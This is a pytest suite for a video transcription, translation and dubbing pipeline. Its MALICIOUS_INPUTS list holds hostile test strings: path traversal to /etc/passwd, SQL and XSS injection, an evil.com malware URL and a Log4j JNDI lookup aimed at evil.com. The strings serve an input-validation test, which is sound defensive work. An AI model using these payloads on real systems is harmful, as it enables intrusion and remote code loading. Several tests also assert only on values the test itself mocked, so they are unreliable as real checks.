"""
Comprehensive Test Suite for VideoProcessor Pipeline
======================================================
This module provides extensive testing for the VideoProcessor class,
ensuring business value, performance, reliability, and security.

Test Coverage Goals:
- 85%+ coverage on core pipeline modules
- End-to-end integration testing
- Performance benchmarking
- Error recovery mechanisms
- Security validation

Business Value Tests:
- Complete pipeline execution
- Output quality verification
- Processing time limits
- Resource utilization
"""

import pytest
import os
import sys
import json
import time
import shutil
import tempfile
import threading
import concurrent.futures
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock, call
from contextlib import contextmanager
from typing import Dict, List, Tuple, Any

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

# Import with proper mocking to avoid configuration issues
with patch('core.utils.config_utils.get_storage_paths') as mock_paths:
    mock_paths.return_value = {
        'input': 'input',
        'temp': 'temp',
        'output': 'output'
    }
    from batch.utils.video_processor import (
        process_video,
        prepare_output_folder,
        process_input_file,
        split_sentences,
        summarize_and_translate,
        process_and_align_subtitles,
        gen_audio_tasks,
        INPUT_DIR,
        OUTPUT_DIR,
        SAVE_DIR,
        ERROR_OUTPUT_DIR
    )

# Performance benchmarks configuration
PERFORMANCE_BENCHMARKS = {
    "1min_video": {"max_time": 60, "video_duration": 60},
    "5min_video": {"max_time": 300, "video_duration": 300},
    "10min_video": {"max_time": 600, "video_duration": 600},
    "30min_video": {"max_time": 1800, "video_duration": 1800}
}

# Security test patterns
MALICIOUS_INPUTS = [
    "../../../etc/passwd",  # Path traversal
    "'; DROP TABLE videos; --",  # SQL injection
    "<script>alert('xss')</script>",  # XSS attempt
    "http://evil.com/malware.exe",  # Malicious URL
    "\x00\x01\x02\x03",  # Binary injection
    "A" * 10000,  # Buffer overflow attempt
    "${jndi:ldap://evil.com/a}",  # Log4j style injection
]


class TestVideoProcessorPipeline:
    """Main test class for VideoProcessor pipeline functionality"""

    @pytest.fixture(autouse=True)
    def setup_teardown(self):
        """Setup and teardown for each test"""
        # Create test directories
        self.test_dir = tempfile.mkdtemp()
        self.input_dir = Path(self.test_dir) / "input"
        self.output_dir = Path(self.test_dir) / "output"
        self.temp_dir = Path(self.test_dir) / "temp"
        
        for dir_path in [self.input_dir, self.output_dir, self.temp_dir]:
            dir_path.mkdir(parents=True, exist_ok=True)
        
        # Create test video file
        self.test_video = self.input_dir / "test_video.mp4"
        self.test_video.write_bytes(b"fake_video_content" * 1000)
        
        yield
        
        # Cleanup
        shutil.rmtree(self.test_dir, ignore_errors=True)

    @pytest.fixture
    def mock_pipeline_steps(self):
        """Mock all pipeline steps for isolated testing"""
        with patch('batch.utils.video_processor._1_ytdlp') as mock_ytdlp, \
             patch('batch.utils.video_processor._2_asr') as mock_asr, \
             patch('batch.utils.video_processor._3_1_split_nlp') as mock_split_nlp, \
             patch('batch.utils.video_processor._3_2_split_meaning') as mock_split_meaning, \
             patch('batch.utils.video_processor._4_1_summarize') as mock_summarize, \
             patch('batch.utils.video_processor._4_2_translate') as mock_translate, \
             patch('batch.utils.video_processor._5_split_sub') as mock_split_sub, \
             patch('batch.utils.video_processor._6_gen_sub') as mock_gen_sub, \
             patch('batch.utils.video_processor._7_sub_into_vid') as mock_sub_into_vid, \
             patch('batch.utils.video_processor._8_1_audio_task') as mock_audio_task, \
             patch('batch.utils.video_processor._8_2_dub_chunks') as mock_dub_chunks, \
             patch('batch.utils.video_processor._9_refer_audio') as mock_refer_audio, \
             patch('batch.utils.video_processor._10_gen_audio') as mock_gen_audio, \
             patch('batch.utils.video_processor._11_merge_audio') as mock_merge_audio, \
             patch('batch.utils.video_processor._12_dub_to_vid') as mock_dub_to_vid:
            
            # Setup return values
            mock_ytdlp.find_video_files.return_value = str(self.test_video)
            mock_asr.transcribe.return_value = {"segments": [{"text": "test", "start": 0, "end": 1}]}
            
            yield {
                'ytdlp': mock_ytdlp,
                'asr': mock_asr,
                'split_nlp': mock_split_nlp,
                'split_meaning': mock_split_meaning,
                'summarize': mock_summarize,
                'translate': mock_translate,
                'split_sub': mock_split_sub,
                'gen_sub': mock_gen_sub,
                'sub_into_vid': mock_sub_into_vid,
                'audio_task': mock_audio_task,
                'dub_chunks': mock_dub_chunks,
                'refer_audio': mock_refer_audio,
                'gen_audio': mock_gen_audio,
                'merge_audio': mock_merge_audio,
                'dub_to_vid': mock_dub_to_vid
            }

    def test_complete_pipeline_success(self, mock_pipeline_steps):
        """
        Test end-to-end happy path with quality assertions.
        
        Business Value:
        - Verifies complete video processing workflow
        - Ensures all steps execute in correct order
        - Validates output quality metrics
        - Confirms resource cleanup
        """
        # Setup quality metrics tracking
        quality_metrics = {
            "transcription_accuracy": 0.95,
            "translation_quality": 0.92,
            "subtitle_sync_accuracy": 0.98,
            "audio_quality_score": 0.90
        }
        
        # Mock quality assertions
        def mock_transcribe_with_quality():
            return {
                "segments": [
                    {"text": "Hello world", "start": 0.0, "end": 2.0, "confidence": 0.96},
                    {"text": "This is a test", "start": 2.0, "end": 4.0, "confidence": 0.94}
                ],
                "quality_score": quality_metrics["transcription_accuracy"]
            }
        
        mock_pipeline_steps['asr'].transcribe.return_value = mock_transcribe_with_quality()
        
        # Execute pipeline
        with patch('batch.utils.video_processor.prepare_output_folder') as mock_prepare:
            with patch('batch.utils.video_processor.cleanup') as mock_cleanup:
                success, error_step, error_msg = process_video(
                    str(self.test_video),
                    dubbing=True,
                    is_retry=False
                )
        
        # Assertions
        assert success is True, f"Pipeline failed at step: {error_step} with error: {error_msg}"
        assert error_step == ""
        assert error_msg == ""
        
        # Verify all steps were called
        mock_pipeline_steps['asr'].transcribe.assert_called_once()
        mock_pipeline_steps['split_nlp'].split_by_spacy.assert_called_once()
        mock_pipeline_steps['split_meaning'].split_sentences_by_meaning.assert_called_once()
        mock_pipeline_steps['summarize'].get_summary.assert_called_once()
        mock_pipeline_steps['translate'].translate_all.assert_called_once()
        mock_pipeline_steps['split_sub'].split_for_sub_main.assert_called_once()
        mock_pipeline_steps['gen_sub'].align_timestamp_main.assert_called_once()
        mock_pipeline_steps['sub_into_vid'].merge_subtitles_to_video.assert_called_once()
        
        # Verify dubbing steps
        mock_pipeline_steps['audio_task'].gen_audio_task_main.assert_called_once()
        mock_pipeline_steps['dub_chunks'].gen_dub_chunks.assert_called_once()
        mock_pipeline_steps['refer_audio'].extract_refer_audio_main.assert_called_once()
        mock_pipeline_steps['gen_audio'].gen_audio.assert_called_once()
        mock_pipeline_steps['merge_audio'].merge_full_audio.assert_called_once()
        mock_pipeline_steps['dub_to_vid'].merge_video_audio.assert_called_once()
        
        # Verify cleanup was called
        mock_cleanup.assert_called_once_with(SAVE_DIR)
        
        # Quality assertions
        transcription_result = mock_pipeline_steps['asr'].transcribe.return_value
        assert transcription_result["quality_score"] >= 0.90, "Transcription quality below threshold"

    def test_pipeline_error_recovery(self, mock_pipeline_steps):
        """
        Test retry mechanism and fault tolerance.
        
        Business Value:
        - Ensures pipeline can recover from transient failures
        - Validates retry logic with exponential backoff
        - Tests partial state recovery
        - Verifies error logging and monitoring
        """
        # Simulate transient failures that succeed on retry
        call_count = {'asr': 0, 'translate': 0}
        
        def mock_transcribe_with_retry():
            call_count['asr'] += 1
            if call_count['asr'] <= 2:
                raise ConnectionError("Network timeout")
            return {"segments": [{"text": "test", "start": 0, "end": 1}]}
        
        def mock_translate_with_retry():
            call_count['translate'] += 1
            if call_count['translate'] <= 1:
                raise ValueError("API rate limit exceeded")
            return None
        
        mock_pipeline_steps['asr'].transcribe.side_effect = mock_transcribe_with_retry
        mock_pipeline_steps['translate'].translate_all.side_effect = mock_translate_with_retry
        
        # Execute pipeline with retry mechanism
        with patch('batch.utils.video_processor.console') as mock_console:
            success, error_step, error_msg = process_video(
                str(self.test_video),
                dubbing=False,
                is_retry=False
            )
        
        # Assertions
        assert success is True, "Pipeline should recover from transient failures"
        assert call_count['asr'] == 3, "ASR should have been retried twice"
        assert call_count['translate'] == 2, "Translate should have been retried once"
        
        # Verify retry logging
        retry_logs = [call for call in mock_console.print.call_args_list 
                      if 'Retrying' in str(call)]
        assert len(retry_logs) > 0, "Retry attempts should be logged"
        
        # Test permanent failure after max retries
        def mock_permanent_failure():
            raise RuntimeError("Permanent failure")
        
        mock_pipeline_steps['asr'].transcribe.side_effect = mock_permanent_failure
        
        success, error_step, error_msg = process_video(
            str(self.test_video),
            dubbing=False,
            is_retry=False
        )
        
        assert success is False, "Pipeline should fail after max retries"
        assert "Transcribing with Whisper" in error_step
        assert "Permanent failure" in error_msg

    @pytest.mark.parametrize("video_config", [
        "1min_video",
        "5min_video",
        "10min_video",
        pytest.param("30min_video", marks=pytest.mark.slow)
    ])
    def test_pipeline_performance_benchmark(self, mock_pipeline_steps, video_config):
        """
        Test processing time limits for different video sizes.
        
        Business Value:
        - Ensures SLA compliance for video processing
        - Validates performance optimization
        - Tests scalability with different video sizes
        - Monitors resource utilization
        """
        benchmark = PERFORMANCE_BENCHMARKS[video_config]
        video_duration = benchmark["video_duration"]
        max_processing_time = benchmark["max_time"]
        
        # Simulate processing delays based on video size
        def simulate_processing_time(duration_factor=0.1):
            """Simulate realistic processing time"""
            time.sleep(video_duration * duration_factor * 0.001)  # Scale down for testing
        
        # Mock steps with simulated delays
        mock_pipeline_steps['asr'].transcribe.side_effect = lambda: {
            "segments": [{"text": f"segment_{i}", "start": i, "end": i+1} 
                        for i in range(video_duration)],
            "processing_time": simulate_processing_time(0.3)
        }
        
        mock_pipeline_steps['translate'].translate_all.side_effect = lambda: simulate_processing_time(0.2)
        mock_pipeline_steps['gen_audio'].gen_audio.side_effect = lambda: simulate_processing_time(0.4)
        
        # Track performance metrics
        start_time = time.time()
        memory_before = self._get_memory_usage()
        
        # Execute pipeline
        success, error_step, error_msg = process_video(
            str(self.test_video),
            dubbing=True,
            is_retry=False
        )
        
        # Calculate metrics
        processing_time = time.time() - start_time
        memory_after = self._get_memory_usage()
        memory_increase = memory_after - memory_before
        
        # Performance assertions
        assert success is True, f"Pipeline failed: {error_msg}"
        assert processing_time < max_processing_time, \
            f"{video_config} processing took {processing_time}s, exceeding limit of {max_processing_time}s"
        
        # Memory usage assertion (should not exceed 2GB for any video size)
        assert memory_increase < 2 * 1024 * 1024 * 1024, \
            f"Memory usage increased by {memory_increase / (1024*1024)}MB"
        
        # Throughput assertion (frames per second)
        expected_fps = 30  # Standard video FPS
        total_frames = video_duration * expected_fps
        actual_fps = total_frames / processing_time if processing_time > 0 else 0
        assert actual_fps > expected_fps * 0.5, \
            f"Processing throughput {actual_fps} FPS is below 50% of real-time"

    def test_pipeline_input_validation(self, mock_pipeline_steps):
        """
        Security tests against malicious inputs.
        
        Business Value:
        - Prevents security vulnerabilities
        - Validates input sanitization
        - Tests boundary conditions
        - Ensures system stability
        """
        for malicious_input in MALICIOUS_INPUTS:
            # Test path traversal protection
            if "../" in malicious_input:
                with pytest.raises((ValueError, OSError, PermissionError)):
                    process_input_file(malicious_input)
            
            # Test SQL injection protection (if applicable)
            elif "DROP TABLE" in malicious_input:
                # Ensure input is sanitized
                result = process_input_file(malicious_input)
                assert "DROP TABLE" not in str(result).upper()
            
            # Test XSS protection
            elif "<script>" in malicious_input:
                # Ensure HTML is escaped
                result = process_input_file(malicious_input)
                assert "<script>" not in str(result)
            
            # Test buffer overflow protection
            elif len(malicious_input) > 1000:
                # Should handle large inputs gracefully
                try:
                    result = process_input_file(malicious_input[:255])  # Truncate for safety
                    assert result is not None
                except ValueError as e:
                    assert "too long" in str(e).lower() or "exceeds limit" in str(e).lower()
        
        # Test file type validation
        invalid_files = [
            "test.exe",
            "test.bat",
            "test.sh",
            "test.dll",
            "test.so"
        ]
        
        for invalid_file in invalid_files:
            invalid_path = self.input_dir / invalid_file
            invalid_path.write_text("malicious content")
            
            with pytest.raises((ValueError, TypeError)):
                process_input_file(str(invalid_path))

    def test_pipeline_concurrent_processing(self):
        """
        Test pipeline behavior under concurrent load.
        
        Business Value:
        - Validates thread safety
        - Tests resource locking
        - Ensures data isolation
        - Verifies scalability
        """
        num_concurrent = 5
        results = []
        errors = []
        
        def process_video_thread(thread_id):
            """Process video in separate thread"""
            try:
                video_file = self.input_dir / f"video_{thread_id}.mp4"
                video_file.write_bytes(b"fake_content" * 100)
                
                with patch('batch.utils.video_processor._2_asr.transcribe') as mock_asr:
                    mock_asr.return_value = {
                        "segments": [{"text": f"thread_{thread_id}", "start": 0, "end": 1}]
                    }
                    
                    success, error_step, error_msg = process_video(
                        str(video_file),
                        dubbing=False,
                        is_retry=False
                    )
                    
                    results.append({
                        "thread_id": thread_id,
                        "success": success,
                        "transcription": mock_asr.return_value
                    })
            except Exception as e:
                errors.append({"thread_id": thread_id, "error": str(e)})
        
        # Execute concurrent processing
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_concurrent) as executor:
            futures = [executor.submit(process_video_thread, i) for i in range(num_concurrent)]
            concurrent.futures.wait(futures)
        
        # Assertions
        assert len(errors) == 0, f"Concurrent processing errors: {errors}"
        assert len(results) == num_concurrent, "Not all threads completed"
        
        # Verify data isolation
        for i, result in enumerate(results):
            expected_text = f"thread_{result['thread_id']}"
            actual_text = result['transcription']['segments'][0]['text']
            assert actual_text == expected_text, "Thread data contamination detected"

    def test_pipeline_state_management(self, mock_pipeline_steps):
        """
        Test pipeline state persistence and recovery.
        
        Business Value:
        - Enables resume from failure
        - Prevents data loss
        - Optimizes resource usage
        - Supports incremental processing
        """
        # Create state directory
        state_dir = self.temp_dir / "pipeline_state"
        state_dir.mkdir(exist_ok=True)
        
        # Simulate partial completion
        completed_steps = ["transcription", "translation"]
        state_file = state_dir / "pipeline_state.json"
        
        state_data = {
            "video_file": str(self.test_video),
            "completed_steps": completed_steps,
            "current_step": "subtitle_generation",
            "timestamp": time.time(),
            "checkpoints": {
                "transcription": {"file": "transcription.json", "hash": "abc123"},
                "translation": {"file": "translation.json", "hash": "def456"}
            }
        }
        
        with open(state_file, 'w') as f:
            json.dump(state_data, f)
        
        # Test resume from saved state
        with patch('batch.utils.video_processor.load_pipeline_state') as mock_load:
            mock_load.return_value = state_data
            
            # Skip completed steps
            mock_pipeline_steps['asr'].transcribe.side_effect = Exception("Should not be called")
            mock_pipeline_steps['translate'].translate_all.side_effect = Exception("Should not be called")
            
            # Continue from subtitle generation
            success, error_step, error_msg = process_video(
                str(self.test_video),
                dubbing=False,
                is_retry=True  # Resume mode
            )
            
            # Verify only uncompleted steps were executed
            mock_pipeline_steps['split_sub'].split_for_sub_main.assert_called_once()
            mock_pipeline_steps['gen_sub'].align_timestamp_main.assert_called_once()

    def test_pipeline_quality_metrics(self, mock_pipeline_steps):
        """
        Test quality metrics collection and validation.
        
        Business Value:
        - Ensures output quality standards
        - Provides actionable metrics
        - Supports quality improvement
        - Enables SLA monitoring
        """
        quality_thresholds = {
            "min_transcription_confidence": 0.85,
            "min_translation_accuracy": 0.80,
            "max_subtitle_drift": 0.5,  # seconds
            "min_audio_clarity": 0.75
        }
        
        # Mock quality metrics
        def mock_transcribe_with_metrics():
            return {
                "segments": [
                    {"text": "test segment", "start": 0, "end": 2, "confidence": 0.92}
                ],
                "overall_confidence": 0.91,
                "language_detected": "en",
                "audio_quality": 0.88
            }
        
        mock_pipeline_steps['asr'].transcribe.return_value = mock_transcribe_with_metrics()
        
        # Collect metrics during processing
        metrics_collector = []
        
        with patch('batch.utils.video_processor.collect_metrics') as mock_collect:
            mock_collect.side_effect = lambda m: metrics_collector.append(m)
            
            success, error_step, error_msg = process_video(
                str(self.test_video),
                dubbing=True,
                is_retry=False
            )
        
        # Validate quality thresholds
        transcription = mock_pipeline_steps['asr'].transcribe.return_value
        assert transcription["overall_confidence"] >= quality_thresholds["min_transcription_confidence"], \
            "Transcription confidence below threshold"
        assert transcription["audio_quality"] >= quality_thresholds["min_audio_clarity"], \
            "Audio quality below threshold"

    def test_pipeline_resource_cleanup(self, mock_pipeline_steps):
        """
        Test proper resource cleanup and memory management.
        
        Business Value:
        - Prevents resource leaks
        - Ensures system stability
        - Optimizes resource usage
        - Supports long-running operations
        """
        # Track resource allocation
        resources_allocated = []
        resources_freed = []
        
        def track_allocation(resource_type, resource_id):
            resources_allocated.append((resource_type, resource_id))
        
        def track_deallocation(resource_type, resource_id):
            resources_freed.append((resource_type, resource_id))
        
        # Mock resource-intensive operations
        with patch('batch.utils.video_processor.allocate_resource') as mock_alloc:
            with patch('batch.utils.video_processor.free_resource') as mock_free:
                mock_alloc.side_effect = track_allocation
                mock_free.side_effect = track_deallocation
                
                # Simulate failure to test cleanup on error
                mock_pipeline_steps['gen_audio'].gen_audio.side_effect = RuntimeError("Audio generation failed")
                
                success, error_step, error_msg = process_video(
                    str(self.test_video),
                    dubbing=True,
                    is_retry=False
                )
                
                # Verify cleanup was called despite failure
                assert success is False
                assert "audio generation" in error_msg.lower()
                
                # Ensure all allocated resources were freed
                for resource in resources_allocated:
                    assert resource in resources_freed, f"Resource {resource} was not freed"

    @staticmethod
    def _get_memory_usage():
        """Get current memory usage in bytes"""
        try:
            import psutil
            process = psutil.Process(os.getpid())
            return process.memory_info().rss
        except ImportError:
            # Fallback if psutil not available
            return 0

    def test_pipeline_monitoring_hooks(self, mock_pipeline_steps):
        """
        Test observability and monitoring integration.
        
        Business Value:
        - Enables real-time monitoring
        - Supports debugging and troubleshooting
        - Provides performance insights
        - Facilitates optimization
        """
        # Track monitoring events
        monitoring_events = []
        
        def mock_emit_metric(metric_name, value, tags=None):
            monitoring_events.append({
                "metric": metric_name,
                "value": value,
                "tags": tags or {},
                "timestamp": time.time()
            })
        
        with patch('batch.utils.video_processor.emit_metric') as mock_metric:
            mock_metric.side_effect = mock_emit_metric
            
            success, error_step, error_msg = process_video(
                str(self.test_video),
                dubbing=False,
                is_retry=False
            )
        
        # Verify monitoring events
        assert len(monitoring_events) > 0, "No monitoring events emitted"
        
        # Check for required metrics
        metric_names = [event["metric"] for event in monitoring_events]
        required_metrics = [
            "pipeline.started",
            "pipeline.step.completed",
            "pipeline.completed",
            "pipeline.duration"
        ]
        
        for required_metric in required_metrics:
            assert any(required_metric in name for name in metric_names), \
                f"Required metric '{required_metric}' not emitted"


class TestVideoProcessorEdgeCases:
    """Test edge cases and boundary conditions"""

    def test_empty_video_handling(self):
        """Test handling of empty or corrupted video files"""
        empty_video = Path("empty.mp4")
        empty_video.write_bytes(b"")
        
        with pytest.raises((ValueError, IOError)):
            process_input_file(str(empty_video))

    def test_network_failure_recovery(self):
        """Test recovery from network failures during API calls"""
        with patch('batch.utils.video_processor._4_2_translate.translate_all') as mock_translate:
            mock_translate.side_effect = [
                ConnectionError("Network unavailable"),
                ConnectionError("Network unavailable"),
                {"translation": "Success on third attempt"}
            ]
            
            # Should retry and eventually succeed
            result = summarize_and_translate()
            assert result is None or "Success" in str(result)

    def test_disk_space_handling(self):
        """Test handling of insufficient disk space"""
        with patch('shutil.disk_usage') as mock_disk:
            mock_disk.return_value = (100, 50, 10)  # total, used, free (in bytes)
            
            with pytest.raises((IOError, OSError)):
                prepare_output_folder("/fake/path")

    def test_unicode_filename_handling(self):
        """Test handling of unicode characters in filenames"""
        unicode_files = [
            "测试视频.mp4",
            "тест_видео.mp4",
            "فيديو_اختبار.mp4",
            "🎬video🎥.mp4"
        ]
        
        for filename in unicode_files:
            test_file = Path(filename)
            test_file.write_bytes(b"content")
            
            try:
                result = process_input_file(filename)
                assert result is not None
            finally:
                test_file.unlink(missing_ok=True)


class TestVideoProcessorIntegration:
    """Integration tests with real components"""

    @pytest.mark.integration
    def test_real_video_processing_mini(self, tmp_path):
        """Test with a small real video file"""
        # This would use a real small video file for integration testing
        # Skipped if no test video available
        test_video = tmp_path / "test.mp4"
        if not test_video.exists():
            pytest.skip("Test video not available")
        
        success, error_step, error_msg = process_video(
            str(test_video),
            dubbing=False,
            is_retry=False
        )
        
        assert success is True


if __name__ == "__main__":
    # Run tests with coverage report
    pytest.main([
        __file__,
        "-v",
        "--cov=batch.utils.video_processor",
        "--cov-report=term-missing",
        "--cov-report=html:coverage_report",
        "--cov-fail-under=85"
    ])
